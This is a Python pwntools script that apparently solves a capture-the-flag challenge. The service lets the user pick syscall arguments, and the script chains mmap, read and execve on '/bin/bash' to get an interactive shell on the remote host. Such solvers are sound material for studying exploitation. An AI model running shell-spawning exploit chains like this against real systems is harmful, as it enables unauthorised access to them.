import argparse
from mmap import MAP_ANONYMOUS

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))


def syscall(num, rdi = None, rsi = None, rdx = None, r10 = None, r8 = None, r9 = None):
    r.recvuntil("rdi?\n")
    if rdi is not None:
        r.sendline(str(rdi))
    else:
        r.sendline('0')
    r.recvuntil("rsi?\n")
    if rsi is not None:
        r.sendline(str(rsi))
    else:
        r.sendline('0')
    r.recvuntil("rdx?\n")
    if rdx is not None:
        r.sendline(str(rdx))
    else:
        r.sendline('0')
    r.recvuntil("r10?\n")
    if r10 is not None:
        r.sendline(str(r10))
    else:
        r.sendline('0')
    r.recvuntil("r8?\n")
    if r8 is not None:
        r.sendline(str(r8))
    else:
        r.sendline('0')
    r.recvuntil("r9?\n")
    if r9 is not None:
        r.sendline(str(r9))
    else:
        r.sendline('0')
    r.recvuntil("call?\n")
    r.sendline(str(num))
    r.recvuntil(");\n")


# THESE ARE ARM64
# My stupid macbook can't build the x86 version!!
# sys_read = 63
# sys_write = 64
# sys_execve = 221
# sys_mmap = 222

# x86
sys_read = 0
sys_write = 1
sys_mmap = 9
sys_execve = 59
MAP_PRIVATE = 0x02
MAP_FIXED = 0x10
MAP_ANONYMOUS = 0x20
MAP_FAILED = 0x10000000000000000 - 1
PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04

buffer = 0x1000000000

syscall(sys_mmap, buffer, 0x1000, PROT_READ | PROT_WRITE |
               PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, 0, 0)

r.recvuntil("returned ")
mmap = int(r.recvuntil("\n").decode(), 0)

assert mmap != MAP_FAILED

r.recvuntil('(0/1)?\n')
r.sendline('1')

syscall(sys_read, 0, buffer, 100)

payload = "/bin/bash\0"

r.send(payload)
r.recvuntil("returned ")
read_len = int(r.recvuntil("\n").decode(), 0)

assert read_len == len(payload)

r.recvuntil('(0/1)?\n')
r.sendline('1')

syscall(sys_execve, buffer, 0, 0)

r.interactive()
